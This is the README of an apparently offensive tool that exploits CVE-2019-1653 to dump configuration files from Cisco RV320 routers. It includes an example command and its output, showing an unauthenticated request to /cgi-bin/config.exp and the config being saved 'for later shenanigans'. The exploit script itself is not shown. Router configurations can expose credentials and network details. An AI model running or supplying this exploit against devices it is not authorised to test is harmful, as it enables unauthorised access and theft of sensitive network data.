# CiscoRV320Dump
CVE-2019-1653 Exploit For Dumping Cisco RV320 Configurations

All this does is dump the config out to a file for later shenanigans using the [CVE-2019-1653](https://seclists.org/fulldisclosure/2019/Jan/52) exploit disclosed by Red Team Pentesting GmbH.

Example Use:
```
$ python getconfig.py -t x.x.x.x -p 8443 -s -d output
{+} Sending request to https://x.x.x.x:8443/cgi-bin/config.exp
{*} We seem to have found a valid config! Writing to output/x.x.x.x_8443.conf
$
```
